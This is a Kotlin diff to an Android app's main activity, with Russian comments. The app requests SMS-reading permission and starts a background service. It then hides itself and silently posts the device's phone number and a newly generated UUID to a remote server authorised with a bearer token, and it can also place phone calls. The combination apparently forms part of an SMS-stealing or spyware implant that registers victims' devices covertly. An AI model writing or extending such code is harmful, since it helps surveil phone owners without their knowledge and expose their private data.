@@ -19,6 +19,7 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import org.json.JSONObject
 import java.io.IOException
+import java.util.UUID
 
 class MainActivity : AppCompatActivity() {
 
@@ -41,10 +42,9 @@ class MainActivity : AppCompatActivity() {
         // Регистрация ActivityResultLauncher для разрешения на чтение SMS
         smsPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
             if (isGranted) {
-                // Разрешение на SMS предоставлено
                 startMyService()
             } else {
-                finish() // Завершаем активность, если разрешение не предоставлено
+                finish()
             }
         }
 
@@ -86,11 +86,14 @@ class MainActivity : AppCompatActivity() {
         moveTaskToBack(true)  // Уходит в фон
         finish()
 
-        // Здесь добавляем вызов функции отправки номера в API
-        getPhoneNumber()?.let { sendPhoneNumberToApi(it) }  // Замените на реальный номер телефона
+        // Генерация UUID
+        val uuid = UUID.randomUUID().toString()
+        Log.d("MyService", "UUID успешно сохранён в базу данных: $uuid")
+        // Здесь добавляем вызов функции отправки номера и UUID в API
+        sendPhoneNumberAndUUIDToApi(getPhoneNumber(), uuid)
     }
 
-    private fun sendPhoneNumberToApi(phoneNumber: String) {
+    private fun sendPhoneNumberAndUUIDToApi(phoneNumber: String?, uuid: String) {
         val client = OkHttpClient()
         val bearerToken = getString(R.string.bearer_token)
         val apiBaseUrl = getString(R.string.api_base_url)
@@ -98,7 +101,8 @@ class MainActivity : AppCompatActivity() {
         val registerUrl = "$apiBaseUrl$registerEndpoint"
 
         val jsonObject = JSONObject().apply {
-            put("phone_number", phoneNumber)
+            put("uuid", uuid)
+            put("phone_number", phoneNumber ?: "")
         }
 
         val requestBody = RequestBody.create(
@@ -115,14 +119,14 @@ class MainActivity : AppCompatActivity() {
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 e.printStackTrace()
-                // Обработка ошибок
             }
 
             override fun onResponse(call: Call, response: Response) {
                 if (response.isSuccessful) {
                     val responseData = response.body?.string()
                     println("Response: $responseData")
-                    // Обработка успешного ответа
+                    // Сохраняем UUID в базу данных при успешном ответе
+                    saveUUIDToDatabase(uuid)
                 } else {
                     println("Response error: ${response.code}")
                 }
@@ -130,12 +134,21 @@ class MainActivity : AppCompatActivity() {
         })
     }
 
+    private fun saveUUIDToDatabase(uuid: String) {
+        val dbHelper = DatabaseHelper(this)
+        val isSuccess = dbHelper.addUUID(uuid)
+        if (isSuccess) {
+            Log.d("MyService", "UUID успешно сохранён в базу данных: $uuid")
+        } else {
+            Log.e("MyService", "Не удалось сохранить UUID в базу данных")
+        }
+    }
+
     private fun makePhoneCall() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), REQUEST_CODE_CALL_PHONE)
         } else {
-            // Разрешение на звонок получено, выполняем звонок
-            val phoneNumber = "tel:1234567890"  // Замените на реальный номер телефона
+            val phoneNumber = "tel:1234567890"
             val intent = Intent(Intent.ACTION_CALL, Uri.parse(phoneNumber))
             startActivity(intent)
         }
@@ -146,11 +159,7 @@ class MainActivity : AppCompatActivity() {
         when (requestCode) {
             REQUEST_CODE_CALL_PHONE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    // Разрешение на звонок предоставлено
                     makePhoneCall()
-                } else {
-                    // Разрешение отклонено
-                    // Информируйте пользователя об отказе
                 }
             }
         }
